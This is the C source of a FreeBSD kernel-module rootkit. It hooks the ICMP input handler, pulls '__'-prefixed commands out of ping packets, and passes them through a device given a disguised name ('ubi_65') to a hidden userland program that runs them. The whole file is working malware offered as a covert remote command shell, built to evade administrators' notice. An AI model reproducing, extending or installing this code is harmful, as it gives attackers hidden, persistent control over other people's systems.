/******************************************************************
 A simple shell over ICMP/IP, we need an external application to perform that
 we store the name of the user application to hide it, and we call the hooked function with the pid of the app, to hide it also.

 ******************************************************************/           

#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/linker.h>
#include <sys/libkern.h>
#include <sys/dirent.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/proc.h>
#include <sys/ioccom.h>

int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td);
int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td);
int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td);
int dev_write(struct cdev *dev, struct uio *uio, int ioflag);
int dev_read(struct cdev *dev, struct uio *uio, int ioflag);


#define APP_NAME "__icmpshell" /* this is the name of the application that execute the command over the ICMP */

static char cmd[256+1]; /* it should be enough */
static struct sx cmd_lock; /* a simple lock of a buffer */

#define VERBOSE 1 /* enable/disable debug messages */

extern struct protosw inetsw[];
pr_input_t icmp_input_hook;

/* character device related functions */
int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td)
{
    return 0;
}

int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td)
{
    return 0;
}

int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td)
{
    return 0;
}


int dev_write(struct cdev *dev, struct uio *uio, int ioflag)
{
    return 0;
}

/* pass the cmd to userland component */
int dev_read(struct cdev *dev, struct uio *uio, int ioflag)
{
    int len;
    
    sx_xlock(&cmd_lock);
    copystr(&cmd, uio->uio_iov->iov_base, strlen(cmd)+1, &len); 

    /* after reading cmd can be cleared */
    bzero(cmd,256);
    sx_xunlock(&cmd_lock);

#if VERBOSE
    printf("Rootkit: read %d bytes from device\n",len);
#endif

    return 0;
}
     
static struct cdevsw devsw = {
	/* version */	.d_version = D_VERSION,
	/* open */	.d_open = dev_open,
	/* close */	.d_close = dev_close,
	/* read */	.d_read = dev_read,
	/* write */	.d_write = dev_write,
	/* ioctl */	.d_ioctl = dev_ioctl,
	/* name */	.d_name = "ubi_65" /* i use ubi to make a credible  name of device */ 
};	
static struct cdev *sdev;
   
/* Handle ICMP echo packets */
void icmp_input_hook(struct mbuf *m, int off)
{
    struct icmp *icmp_header;
	char str[256+1];        
	int len,cnt;

	m->m_len -= off;
        m->m_data += off;
         
        icmp_header = mtod(m, struct icmp *);
         
        m->m_len += off;
        m->m_data -= off;
         
        if (icmp_header->icmp_type == ICMP_ECHO &&
		icmp_header->icmp_data != NULL)
	{
		
		bzero(str,256);	
		copystr(icmp_header->icmp_data, str, 256, &len);
		/* a command should be like this: __cmd; */

		if(strlen(str) > 2)
		{
			if(str[0] == '_' && str[1] == '_')
			{
				cnt = 2;
	
				sx_xlock(&cmd_lock);

				bzero(cmd,256);
				while(str[cnt] != ';' && cnt < 256)
				{
					cmd[cnt-2] = str[cnt];
					cnt++;
				}

				cmd[cnt] = '\0'; 
				sx_xunlock(&cmd_lock);
				/* now the userland program can read&execute the cmd */
#if VERBOSE
				printf("Rootkit: ICMP packet -> cmd: %s\n",cmd);
#endif
			}

			else
			{
				icmp_input(m,off);
			}
		}

		else
		{
			icmp_input(m,off);
		}
	}
        
	else
	{
		icmp_input(m, off);
	}
}


static int load(struct module *module, int cmd, void *arg)
{
        int error = 0;
	        
	switch (cmd) 
	{
		case MOD_LOAD:
#if VERBOSE
			printf("Rootkit: loaded  \n");
#endif
			sx_init(&cmd_lock,"rootkit_lock"); /* this is to avoid race conditions */ 
			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
			sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "ubi_65");
                 	break;
        	
		case MOD_UNLOAD:
#if VERBOSE
			printf("Rootkit: unloaded\n");
#endif
			sx_destroy(&cmd_lock); /* destroy lock */
			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
			destroy_dev(sdev);
                 	break;
        	default:
                 	error = EINVAL;
                 	break;
        }
        
	return error;
}

static moduledata_t roughiz_mod = {
        "roughiz",            
        load,                    
        NULL                     
};

DECLARE_MODULE(roughiz, roughiz_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
